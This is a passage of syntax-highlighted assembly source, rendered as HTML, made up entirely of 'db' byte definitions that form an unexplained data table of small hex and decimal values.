        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Dh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">29h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Bh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Fh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

